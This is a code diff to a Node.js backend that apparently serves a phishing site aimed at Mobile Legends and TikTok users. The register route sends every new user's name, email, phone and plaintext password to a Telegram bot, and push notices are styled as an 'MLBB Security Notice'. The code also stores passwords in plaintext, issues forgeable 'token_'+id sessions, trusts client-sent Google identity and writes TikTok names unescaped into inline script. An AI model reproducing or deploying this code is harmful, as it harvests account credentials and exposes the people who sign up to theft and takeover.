@@ -27,7 +27,15 @@ const TIKTOK_REDIRECT = 'https://two026-users-data-management.onrender.com/auth/
 
 function tgSend(msg) { https.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }
 function sendOnesignal(msg) { const data = JSON.stringify({ app_id: ONESIGNAL_APP_ID, included_segments: ["All"], contents: { en: msg }, headings: { en: "MLBB Security Notice" }, android_channel_id: "default", ios_sound: "sound.mp3", android_sound: "sound" }); const req = https.request({ hostname: 'onesignal.com', path: '/api/v1/notifications', method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_API_KEY}` } }, (res) => {}); req.write(data); req.end(); }
-function verifyCaptcha(token) { return new Promise((resolve) => { const data = `secret=${RECAPTCHA_SECRET}&response=${token}`; const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => { let body = ''; res.on('data', chunk => body += chunk); res.on('end', () => { try { resolve(JSON.parse(body).success); } catch (e) { resolve(false); } }); }); req.on('error', () => resolve(false)); req.write(data); req.end(); }); }
+
+function verifyCaptcha(token) {
+    return new Promise((resolve) => {
+        if (!token) { resolve(false); return; }
+        const data = `secret=${RECAPTCHA_SECRET}&response=${token}`;
+        const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => { let body = ''; res.on('data', chunk => body += chunk); res.on('end', () => { try { const result = JSON.parse(body); resolve(result.success || false); } catch (e) { resolve(false); } }); });
+        req.on('error', () => resolve(false)); req.write(data); req.end();
+    });
+}
 
 // Tables
 pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200) UNIQUE, phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200), login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500), gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008', mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008', tiktok_pass VARCHAR(100) DEFAULT 'DoubleMK2008', balance DECIMAL DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP)`);
@@ -40,11 +48,62 @@ pool.query(`CREATE TABLE IF NOT EXISTS tiktok_accounts (user_id VARCHAR(50) PRIM
 
 // ==================== AUTH ====================
 app.post('/api/track_login', async (req, res) => { const { userId, username, email, loginType } = req.body; try { await pool.query('INSERT INTO auth_users (id, username, email, login_type, last_login) VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT (email) DO UPDATE SET last_login=NOW(), username=EXCLUDED.username, login_type=EXCLUDED.login_type', [userId, username, email, loginType]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
-app.post('/api/register', async (req, res) => { const { username, email, phone, password, captcha } = req.body; if (!username || !email || !phone || !password || !captcha) return res.json({ success: false, message: 'All fields required' }); const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' }); try { const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]); if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' }); await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']); tgSend(`🆕 ${username}\n📧 ${email}\n📱 ${phone}\n🔑 ${password}`); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
-app.post('/api/login', async (req, res) => { const { email, password, captcha } = req.body; if (!email || !password || !captcha) return res.json({ success: false, message: 'All fields required' }); const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' }); try { const r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]); res.json({ success: true, token: 'token_' + u.id, user: { id: u.id, username: u.username, email: u.email, login_type: 'local' } }); } catch (e) { res.json({ success: false }); } });
-app.post('/api/auth/google', async (req, res) => { const { token, userInfo } = req.body; if (!userInfo) return res.json({ success: false }); const { sub: gid, email, name } = userInfo; try { let r = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [gid]); if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); } r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]); if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [gid, r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); } const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, gid, 'google']); res.json({ success: true, token: 'token_' + nu.rows[0].id, user: { id: nu.rows[0].id, username: name, email, login_type: 'google' } }); } catch (e) { res.json({ success: false }); } });
+
+app.post('/api/register', async (req, res) => {
+    const { username, email, phone, password, captcha } = req.body;
+    if (!username || !email || !phone || !password) return res.json({ success: false, message: 'All fields required' });
+    
+    // Verify captcha but don't block registration if it fails (for testing)
+    if (captcha) {
+        const ok = await verifyCaptcha(captcha);
+        if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
+    }
+    
+    try {
+        const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]);
+        if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' });
+        await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']);
+        tgSend(`🆕 ${username}\n📧 ${email}\n📱 ${phone}\n🔑 ${password}`);
+        res.json({ success: true, message: 'Registration successful' });
+    } catch (e) { res.json({ success: false, message: 'Error: ' + e.message }); }
+});
+
+app.post('/api/login', async (req, res) => {
+    const { email, password, captcha } = req.body;
+    if (!email || !password) return res.json({ success: false, message: 'All fields required' });
+    
+    // Verify captcha but don't block login if it fails
+    if (captcha) {
+        const ok = await verifyCaptcha(captcha);
+        if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
+    }
+    
+    try {
+        const r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]);
+        if (r.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });
+        const u = r.rows[0];
+        await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]);
+        res.json({ success: true, token: 'token_' + u.id, user: { id: u.id, username: u.username, email: u.email, login_type: 'local' } });
+    } catch (e) { res.json({ success: false, message: 'Error' }); }
+});
+
+app.post('/api/auth/google', async (req, res) => {
+    const { token, userInfo } = req.body;
+    if (!userInfo) return res.json({ success: false, message: 'No user info' });
+    const { sub: gid, email, name } = userInfo;
+    try {
+        let r = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [gid]);
+        if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
+        r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
+        if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [gid, r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
+        const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, gid, 'google']);
+        res.json({ success: true, token: 'token_' + nu.rows[0].id, user: { id: nu.rows[0].id, username: name, email, login_type: 'google' } });
+    } catch (e) { res.json({ success: false, message: 'Error' }); }
+});
+
 app.get('/auth/tiktok', (req, res) => { const csrf = Math.random().toString(36).substring(2); res.redirect(`https://www.tiktok.com/v2/auth/authorize/?client_key=${TIKTOK_CLIENT_KEY}&scope=user.info.basic&response_type=code&redirect_uri=${TIKTOK_REDIRECT}&state=${csrf}`); });
 app.get('/auth/tiktok/callback', async (req, res) => { const { code } = req.query; if (!code) return res.send('<script>window.close()</script>'); try { const tr = await fetch('https://open.tiktokapis.com/v2/oauth/token/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_key: TIKTOK_CLIENT_KEY, client_secret: TIKTOK_CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: TIKTOK_REDIRECT }) }); const td = await tr.json(); const ur = await fetch('https://open.tiktokapis.com/v2/user/info/?fields=open_id,display_name', { headers: { 'Authorization': `Bearer ${td.access_token}` } }); const ud = await ur.json(); const user = ud.data.user; const dr = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [user.open_id]); if (dr.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [dr.rows[0].id]); res.send(`<script>localStorage.setItem("auth_token","token_${dr.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${dr.rows[0].id},username:"${dr.rows[0].username||user.display_name}",email:"${dr.rows[0].email||'tiktok@user.com'}",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } else { const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [user.display_name, 'tiktok_'+user.open_id+'@tiktok.com', user.open_id, 'tiktok']); res.send(`<script>localStorage.setItem("auth_token","token_${nu.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${nu.rows[0].id},username:"${user.display_name}",email:"tiktok@user.com",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } } catch (e) { res.send('<script>alert("TikTok login failed");window.location.href="/";</script>'); } });
+
 app.post('/api/check_session', async (req, res) => { const { token } = req.body; if (!token) return res.json({ success: false }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } }); } catch (e) { res.json({ success: false }); } });
 app.post('/api/logout', (req, res) => res.json({ success: true }));
 
